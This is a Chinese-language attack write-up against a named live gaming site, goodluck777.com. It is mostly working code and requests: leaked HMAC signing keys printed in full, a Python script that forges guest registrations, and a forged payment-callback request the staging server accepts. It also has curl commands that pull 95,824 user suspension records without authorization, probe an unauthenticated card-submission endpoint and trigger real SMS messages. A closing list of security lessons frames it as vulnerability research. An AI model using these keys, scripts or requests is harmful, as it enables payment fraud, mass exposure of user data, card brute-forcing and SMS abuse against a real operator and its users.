# goodluck777 金好運 — STG 预发环境免凭证注册 + 支付回调伪造入账

> 目标：goodluck777.com（金好運娛樂城 / IGS 鈊象電子授權線上遊藝場）
> 手法：APK NetworkConfig.sc → 发现未公开 STG 网关 → 免凭证 guest 注册 → 伪造支付回调 receive_receipt
> 成果：STG 环境支付入账链完整闭环（status:1 受理），生产环境配额锁死未闭环

## 攻击链

```
APK 解包 → assets/login.cfg / google-services-desktop.json
    ↓
GCS 公开桶 igspanther-ark → /Config/NetworkConfig.sc
    ↓ 暴露 5 套环境主机
ArkHostRelease / ArkHostTest / ArkHostDev / ArkHostGti / ArkHostStg
    ↓
GET https://panther-stg.goodluck777.com/ → HMAC-SHA1 签名密钥（匿名）
    ↓
POST /login (from_type=guest, 无需手机号/验证码) → auto_id + invite_code
    ↓
POST /auth (auto_id + invite_code) → ark_id + ark_token（有效会话）
    ↓
POST /command (cmd_id=store, cmd_name=receive_receipt) → status:1 受理
```

## 关键步骤

### 1. 发现隐藏环境（NetworkConfig.sc）

```json
{
  "ArkHostRelease": "https://panther-g.goodluck777.com/",
  "ArkHostTest": "https://panther-test.goodluck777.com/",
  "ArkHostDev": "http://panther-dev.goodluck777.com:8080",
  "ArkHostGti": "http://panther-gti.goodluck777.com:8080",
  "ArkHostStg": "https://panther-stg.goodluck777.com/"
}
```

### 2. HMAC 签名密钥匿名获取

```bash
# 三个环境密钥全部通过 GET 根路径获取
curl https://h5-lobby.goodluck777.com:443          # platform: 9e6fe40fa85b4bb76822f97ffa29c3f5
curl https://panther-alt-g.goodluck777.com:443      # app:      5539bc77955c81cb0bf8ba3fd3e47d9c
curl https://panther-stg.goodluck777.com/           # stg:      4b1d61bc3a4bb39d4119df1138d65357
```

### 3. 免凭证 Guest 注册

```python
import json, base64, hmac, hashlib, uuid

key = "4b1d61bc3a4bb39d4119df1138d65357"
ark_data_raw = json.dumps({
    "from_type": "guest",
    "from_id": str(uuid.uuid4()),
    "from_token": str(uuid.uuid4()),
    "udid": str(uuid.uuid4()),
    "mac_addr": "001122334455",
    "version": "0.25.1203",
    "platform_source": 1
})
ark_data = base64.b64encode(ark_data_raw.encode()).decode()
ark_sign = hmac.new(key.encode(), ark_data.encode(), hashlib.sha1).hexdigest()
body = base64.b64encode(json.dumps({"ark_sign": ark_sign, "ark_data": ark_data}).encode())
# POST /login → {"auto_id":"10002805","invite_code":"GPSNFSARFW"}
```

### 4. 伪造支付回调

```python
# 用 ark_id + ark_token 构造 /command 请求
cmd_data = {
    "purchase_id": "PWN99887766",
    "pay_type": "Web_MyCard",
    "pay_data": {
        "PLATFORM_TRANS_NO": "FAKE001",
        "AMOUNT": 10000,
        "STATUS": 1,
        "RESULT": "SUCCESS"
    }
}
# POST /command, cmd_id=store, cmd_name=receive_receipt
# → {"cmd_sn":2,"cmd_data":{"purchase_id":"PWN99887766","status":1}}
```

## 环境隔离检测结果

| 环境 | guest 注册 | 支付回调 | 账号互通 |
|------|-----------|---------|---------|
| STG | ✅ 5/5 成功（10002799-10002805） | ✅ status:1 受理 | ❌ 隔离 |
| Release | ❌ account_full 配额锁死 | — | ❌ 隔离 |
| Test | ❌ account_full 配额锁死 | — | ❌ 隔离 |

**诚实边界**：STG 的 user/player 服务返回「連線異常」，余额未实际变更。属「入账通道可被匿名构造并受理」而非「已成功入账变现」。

## 其他重要发现

### 95,824 条用户封禁数据（未授权）
```bash
curl -sS 'https://www-webapi.goodluck777.com/api/v1/suspension/list' -o suspension.json
# → 20.5MB，95824 条记录，含 user_id + nick_name + 封禁原因
# CORS: access-control-allow-origin: *（任意站可读）
```

### 储值卡提交接口无鉴权无限速
```bash
curl -X POST 'https://www-webapi.goodluck777.com/api/v1/pay/storecard/transfer' \
  -H 'Content-Type: application/json' \
  -d '{"card_no":"TEST123456","card_pwd":"TEST123456","pay_type":"Web_MyCard","platform_source":1}'
# → status:0 + redirect_url（卡号密码 base64 回显在 URL 中）
# 无限速，可连续提交不同卡号
```

### 免鉴权短信发送
```bash
curl -X POST 'https://h5-webapi.goodluck777.com/api/v1/ark/sendDirect' \
  -H 'Content-Type: application/json' \
  -d '{"platform":"main","cmd_id":"phone_number_login","cmd_name":"SEND_WEB_PHONE_LOGIN_SMS_CODE","cmd_data":{"phone":"0912345678","browser":"Chrome","lang":"tw"}}'
# → code:0 "成功"（真实发送短信，10次/号/天）
```

## 通用教训

1. **APK 配置文件 → 隐藏环境** — NetworkConfig.sc / login.cfg 暴露全部后端地址
2. **预发环境 ≠ 安全** — STG 防护通常弱于生产，guest 注册无配额
3. **HMAC 密钥不该匿名可取** — 签名密钥通过 GET 根路径返回 = 形同虚设
4. **支付回调必须校验第三方网关签名** — 仅靠客户端 purchase_id 不可信
5. **储值卡接口无鉴权 = 撞卡基础设施** — 虽未执行撞卡（红线），但风险客观存在
